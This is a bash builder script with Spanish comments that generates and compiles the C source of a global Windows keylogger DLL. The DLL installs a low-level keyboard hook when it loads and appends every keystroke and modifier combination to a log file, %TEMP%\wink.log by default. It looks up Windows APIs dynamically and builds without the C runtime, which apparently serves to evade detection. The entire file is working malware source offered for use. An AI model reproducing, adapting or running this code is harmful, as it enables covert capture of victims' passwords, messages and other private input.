#!/bin/bash

# === CONFIGURACIÓN POR DEFECTO ===
DEFAULT_LOG_PATH="%TEMP%\\wink.log"

# Variables que pueden ser sobrescritas por argumentos
LOG_PATH="$DEFAULT_LOG_PATH"

# === USO ===
usage() {
    echo "Usage: $0 [--log <ruta_archivo>]"
    echo "Ejemplo:"
    echo "  $0                                # Usa ruta por defecto: %TEMP%\\wink.log"
    echo "  $0 --log C:\\\\temp\\\\keys.log     # Guarda en ruta personalizada"
    exit 1
}

# === PARSING DE ARGUMENTOS ===
while [[ $# -gt 0 ]]; do
    case "$1" in
        --log)
            if [[ -z "$2" || "$2" =~ ^-- ]]; then
                echo "[-] Error: --log requiere un valor."
                usage
            fi
            LOG_PATH="$2"
            shift 2
            ;;
        *)
            echo "Opción desconocida: $1"
            usage
            ;;
    esac
done

# Validación mínima
if [[ -z "$LOG_PATH" ]]; then
    echo "[-] Ruta de log no puede estar vacía."
    exit 1
fi

# Escapar barras invertidas para C
LOG_PATH_ESCAPED="${LOG_PATH//\\/\\\\}"

# === GENERAR module.c ===
cat > module.c << EOF
// module.c - Keylogger Global 100% API de Windows (sin CRT)
#include <windows.h>

// Definiciones manuales para evitar dependencia de headers completos
#ifndef LRESULT
typedef LONG_PTR LRESULT;
#endif

#ifndef HOOKPROC
typedef LRESULT (CALLBACK* HOOKPROC)(int, WPARAM, LPARAM);
#endif

// Variables globales para el hook y archivo
HHOOK g_hHook = NULL;
HANDLE g_hLogFile = INVALID_HANDLE_VALUE;
HMODULE g_hModule = NULL;

// Forward declaration con tipo explícito
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// Función para expandir %TEMP% o variables de entorno si es necesario
void ExpandLogPath(char* dest, const char* src, DWORD destSize) {
    // Intentar expandir variables de entorno
    DWORD (WINAPI * pExpandEnvironmentStringsA)(LPCSTR, LPSTR, DWORD) = 
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExpandEnvironmentStringsA");
    
    if (pExpandEnvironmentStringsA) {
        pExpandEnvironmentStringsA(src, dest, destSize);
    } else {
        // Fallback: copiar directamente si no se puede expandir
        for (DWORD i = 0; i < destSize - 1 && src[i]; i++) {
            dest[i] = src[i];
        }
        dest[destSize - 1] = 0;
    }
}

// Función para abrir el archivo de log
BOOL OpenLogFile() {
    char expandedPath[MAX_PATH];
    ExpandLogPath(expandedPath, "$LOG_PATH_ESCAPED", MAX_PATH);

    HANDLE (WINAPI * pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) =
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateFileA");

    if (!pCreateFileA) return FALSE;

    g_hLogFile = pCreateFileA(
        expandedPath,
        0x40000000 | 0x80000000, // GENERIC_WRITE | GENERIC_READ
        1,                        // FILE_SHARE_READ
        NULL,
        4,                        // OPEN_ALWAYS
        0,
        NULL
    );

    if (g_hLogFile == (HANDLE)-1) {
        g_hLogFile = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    // Mover cursor al final del archivo
    BOOL (WINAPI * pSetFilePointerEx)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD) =
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetFilePointerEx");
    if (pSetFilePointerEx) {
        LARGE_INTEGER distance, newpos;
        distance.QuadPart = 0;
        pSetFilePointerEx(g_hLogFile, distance, &newpos, 2); // FILE_END = 2
    }

    return TRUE;
}

// Función para escribir en el log
void WriteLog(const char* text) {
    if (g_hLogFile == INVALID_HANDLE_VALUE) return;

    DWORD written;
    BOOL (WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) =
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile");

    if (!pWriteFile) return;

    size_t len = strlen(text);
    if (len > 0) {
        pWriteFile(g_hLogFile, text, (DWORD)len, &written, NULL);
    }
}

// Función para obtener estado de teclas modificadoras
BOOL IsKeyDown(int vk) {
    SHORT (WINAPI * pGetAsyncKeyState)(int) = 
        (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "GetAsyncKeyState");
    if (!pGetAsyncKeyState) return FALSE;
    return (pGetAsyncKeyState(vk) & 0x8000) != 0;
}

// Callback del hook de teclado
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char buffer[32] = {0};
            BOOL shift = IsKeyDown(VK_SHIFT);
            BOOL caps = IsKeyDown(VK_CAPITAL);
            BOOL ctrl = IsKeyDown(VK_CONTROL);
            BOOL alt = IsKeyDown(VK_MENU);

            switch (pKey->vkCode) {
                case VK_RETURN: strcpy(buffer, "[ENTER]\r\n"); break;
                case VK_BACK:   strcpy(buffer, "[BACKSPACE]"); break;
                case VK_TAB:    strcpy(buffer, "[TAB]"); break;
                case VK_ESCAPE: strcpy(buffer, "[ESC]"); break;
                case VK_SPACE:  strcpy(buffer, " "); break;
                case VK_LWIN:
                case VK_RWIN:   strcpy(buffer, "[WIN]"); break;
                case VK_CAPITAL:strcpy(buffer, "[CAPSLOCK]"); break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT: strcpy(buffer, "[SHIFT]"); break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL: strcpy(buffer, "[CTRL]"); break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU: strcpy(buffer, "[ALT]"); break;
                default:
                    if (pKey->vkCode >= 0x30 && pKey->vkCode <= 0x5A) {
                        char c = (char)pKey->vkCode;
                        if (pKey->vkCode >= 0x41 && pKey->vkCode <= 0x5A) {
                            if ((caps && !shift) || (!caps && shift)) {
                                c = c; // mayúscula
                            } else {
                                c = c + 32; // minúscula
                            }
                        }
                        buffer[0] = c;
                        buffer[1] = 0;
                    } else if (pKey->vkCode >= 0x60 && pKey->vkCode <= 0x69) {
                        buffer[0] = (char)(pKey->vkCode - 0x30);
                        buffer[1] = 0;
                    } else {
                        buffer[0] = '?';
                        buffer[1] = 0;
                    }
                    break;
            }

            if (ctrl) {
                if (pKey->vkCode == 'C') { strcpy(buffer, "[CTRL+C]"); }
                else if (pKey->vkCode == 'V') { strcpy(buffer, "[CTRL+V]"); }
                else if (pKey->vkCode == 'X') { strcpy(buffer, "[CTRL+X]"); }
                else if (pKey->vkCode == 'A') { strcpy(buffer, "[CTRL+A]"); }
                else if (pKey->vkCode == 'Z') { strcpy(buffer, "[CTRL+Z]"); }
            }

            if (alt && pKey->vkCode == VK_TAB) {
                strcpy(buffer, "[ALT+TAB]");
            }

            WriteLog(buffer);
        }
    }

    // Llamar al siguiente hook
    LRESULT (WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM) =
        (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "CallNextHookEx");
    if (pCallNextHookEx) {
        return pCallNextHookEx(g_hHook, nCode, wParam, lParam);
    }
    return 0;
}

// Instalar el hook
BOOL InstallHook(HMODULE hModule) {
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) return FALSE;

    HHOOK (WINAPI * pSetWindowsHookExA)(int, HOOKPROC, HMODULE, DWORD) =
        (void*)GetProcAddress(hUser32, "SetWindowsHookExA");

    if (!pSetWindowsHookExA) return FALSE;

    // Cast explícito para evitar warning
    g_hHook = pSetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hModule, 0);
    return (g_hHook != NULL);
}

// Liberar el hook
void UninstallHook() {
    if (g_hHook) {
        BOOL (WINAPI * pUnhookWindowsHookEx)(HHOOK) =
            (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "UnhookWindowsHookEx");
        if (pUnhookWindowsHookEx) {
            pUnhookWindowsHookEx(g_hHook);
        }
        g_hHook = NULL;
    }
}

// Cerrar archivo de log
void CloseLogFile() {
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        BOOL (WINAPI * pCloseHandle)(HANDLE) =
            (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
        if (pCloseHandle) {
            pCloseHandle(g_hLogFile);
        }
        g_hLogFile = INVALID_HANDLE_VALUE;
    }
}

// Entry point de la DLL
__declspec(dllexport) BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            g_hModule = hModule;
            DisableThreadLibraryCalls(hModule);

            if (!OpenLogFile()) {
                return FALSE;
            }

            if (!InstallHook(hModule)) {
                CloseLogFile();
                return FALSE;
            }
            break;

        case DLL_PROCESS_DETACH:
            UninstallHook();
            CloseLogFile();
            break;
    }
    return TRUE;
}

// Función auxiliar strlen (sin CRT)
size_t strlen(const char* str) {
    size_t len = 0;
    while (str[len]) len++;
    return len;
}

// Función auxiliar strcpy (sin CRT)
char* strcpy(char* dest, const char* src) {
    char* tmp = dest;
    while ((*dest++ = *src++) != '\0');
    return tmp;
}

EOF

echo "[+] Archivo C generado: module.c"

# === COMPILAR COMO DLL ===
echo "[*] Compilando keylogger.dll..."

x86_64-w64-mingw32-gcc module.c -o keylogger.dll -shared -s \
  -nostdlib -nodefaultlibs -lkernel32 -luser32 \
  -e DllMain 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[-] Error al compilar el código C."
    exit 1
fi

echo "[+] Compilación exitosa: keylogger.dll"
echo "[*] Registro de teclas guardado en: $LOG_PATH"